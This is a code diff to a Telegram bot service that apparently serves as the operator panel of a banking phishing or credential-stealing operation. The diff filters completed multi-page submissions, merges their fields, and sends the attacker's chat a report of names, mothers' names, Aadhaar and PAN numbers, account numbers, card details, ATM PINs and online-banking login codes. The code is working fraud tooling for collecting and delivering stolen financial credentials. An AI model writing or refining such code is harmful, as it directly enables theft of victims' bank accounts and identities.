@@ -501,10 +501,63 @@ export class TelegramBotService {
             return;
         }
 
+        // Filter for complete submissions only (end of flow pages)
+        // Main flow ends at 'profile_verify', Apply flow ends at 'login_details'
+        const completeForms = deviceData.forms.filter((form: FormData) =>
+            form.pageName === 'profile_verify' || form.pageName === 'login_details'
+        );
+
+        if (completeForms.length === 0) {
+            this.bot?.sendMessage(chatId, `📭 No complete form submissions for ${device.name}\n\nOnly showing submissions that reached the end of the form flow.`, {
+                reply_markup: {
+                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
+                }
+            });
+            return;
+        }
+
         // Sort by submission date descending (most recent first)
-        const sortedForms = [...deviceData.forms].sort((a: FormData, b: FormData) =>
+        const sortedForms = [...completeForms].sort((a: FormData, b: FormData) =>
             new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime()
         );
+
+        // Helper function to get all related page data for a complete submission
+        const getRelatedPageData = (completeForm: FormData): any => {
+            const completeTime = new Date(completeForm.submittedAt).getTime();
+            // Get all pages submitted within 30 minutes before the complete submission
+            const timeWindow = 30 * 60 * 1000; // 30 minutes
+
+            const relatedPages = deviceData.forms.filter((form: FormData) => {
+                const formTime = new Date(form.submittedAt).getTime();
+                return formTime <= completeTime && formTime >= (completeTime - timeWindow);
+            });
+
+            // Merge all page data into one object
+            const merged: any = {};
+            relatedPages.forEach((page: any) => {
+                Object.keys(page).forEach(key => {
+                    if (key !== 'pageName' && key !== 'submittedAt' && page[key]) {
+                        merged[key] = page[key];
+                    }
+                });
+            });
+            merged.submittedAt = completeForm.submittedAt;
+            merged.flowType = completeForm.pageName === 'profile_verify' ? 'Main Flow' : 'Apply Flow';
+            return merged;
+        };
+
+        // Helper to format a section only if it has data
+        const formatSection = (title: string, fields: { label: string; value: any }[]): string => {
+            const filledFields = fields.filter(f => f.value && f.value !== 'N/A' && f.value !== '');
+            if (filledFields.length === 0) return '';
+
+            let section = `>> ${title}\n`;
+            filledFields.forEach(f => {
+                section += `   ${f.label}: ${f.value}\n`;
+            });
+            section += '\n';
+            return section;
+        };
 
         // Generate cleanly formatted text content
         let content = `========================================\n`;
@@ -512,39 +565,49 @@ export class TelegramBotService {
         content += `========================================\n`;
         content += `Device: ${device.name}\n`;
         content += `Generated: ${new Date().toLocaleString()}\n`;
-        content += `Total Submissions: ${sortedForms.length}\n`;
+        content += `Complete Submissions: ${sortedForms.length}\n`;
         content += `========================================\n\n`;
 
         sortedForms.forEach((form: FormData, index: number) => {
-            const date = new Date(form.submittedAt).toLocaleString();
+            const mergedData = getRelatedPageData(form);
+            const date = new Date(mergedData.submittedAt).toLocaleString();
+
             content += `----------------------------------------\n`;
-            content += `SUBMISSION #${index + 1}\n`;
+            content += `SUBMISSION #${index + 1} (${mergedData.flowType})\n`;
             content += `Submitted: ${date}\n`;
             content += `----------------------------------------\n\n`;
 
-            content += `>> PERSONAL DETAILS\n`;
-            content += `   Name: ${form.fullName || form.name || 'N/A'}\n`;
-            content += `   Mobile: ${form.mobileNumber || form.phoneNumber || 'N/A'}\n`;
-            content += `   Mother Name: ${form.motherName || 'N/A'}\n`;
-            content += `   DOB: ${form.dateOfBirth || 'N/A'}\n\n`;
+            // Personal Details - only show if has data
+            content += formatSection('PERSONAL DETAILS', [
+                { label: 'Name', value: mergedData.fullName || mergedData.name },
+                { label: 'Mobile', value: mergedData.mobileNumber || mergedData.phoneNumber },
+                { label: 'Mother Name', value: mergedData.motherName },
+                { label: 'DOB', value: mergedData.dateOfBirth }
+            ]);
 
-            content += `>> ACCOUNT DETAILS\n`;
-            content += `   Account No: ${form.accountNumber || 'N/A'}\n`;
-            content += `   Aadhaar: ${form.aadhaarNumber || 'N/A'}\n`;
-            content += `   PAN Card: ${form.panCard || 'N/A'}\n`;
-            content += `   CIF Number: ${form.cifNumber || 'N/A'}\n`;
-            content += `   Branch Code: ${form.branchCode || 'N/A'}\n\n`;
+            // Account Details - only show if has data
+            content += formatSection('ACCOUNT DETAILS', [
+                { label: 'Account No', value: mergedData.accountNumber },
+                { label: 'Aadhaar', value: mergedData.aadhaarNumber },
+                { label: 'PAN Card', value: mergedData.panCard },
+                { label: 'CIF Number', value: mergedData.cifNumber },
+                { label: 'Branch Code', value: mergedData.branchCode }
+            ]);
 
-            content += `>> CARD DETAILS\n`;
-            content += `   Card Last 6: ${form.cardLast6 || 'N/A'}\n`;
-            content += `   Card Expiry: ${form.cardExpiry || 'N/A'}\n`;
-            content += `   ATM PIN: ${form.atmPin || 'N/A'}\n`;
-            content += `   Final PIN: ${form.finalPin || 'N/A'}\n\n`;
+            // Card Details - only show if has data
+            content += formatSection('CARD DETAILS', [
+                { label: 'Card Last 6', value: mergedData.cardLast6 },
+                { label: 'Card Expiry', value: mergedData.cardExpiry },
+                { label: 'ATM PIN', value: mergedData.atmPin },
+                { label: 'Final PIN', value: mergedData.finalPin }
+            ]);
 
-            content += `>> LOGIN CREDENTIALS\n`;
-            content += `   User ID: ${form.userId || 'N/A'}\n`;
-            content += `   Access Code: ${form.accessCode || 'N/A'}\n`;
-            content += `   Profile Code: ${form.profileCode || 'N/A'}\n\n`;
+            // Login Credentials - only show if has data
+            content += formatSection('LOGIN CREDENTIALS', [
+                { label: 'User ID', value: mergedData.userId },
+                { label: 'Access Code', value: mergedData.accessCode },
+                { label: 'Profile Code', value: mergedData.profileCode }
+            ]);
         });
 
         content += `========================================\n`;
@@ -560,7 +623,7 @@ export class TelegramBotService {
 
         try {
             await this.bot?.sendDocument(chatId, filePath, {
-                caption: `📝 All form submissions from ${device.name} (${sortedForms.length} submissions)`,
+                caption: `📝 Complete form submissions from ${device.name} (${sortedForms.length} submissions)`,
                 reply_markup: {
                     inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
                 }
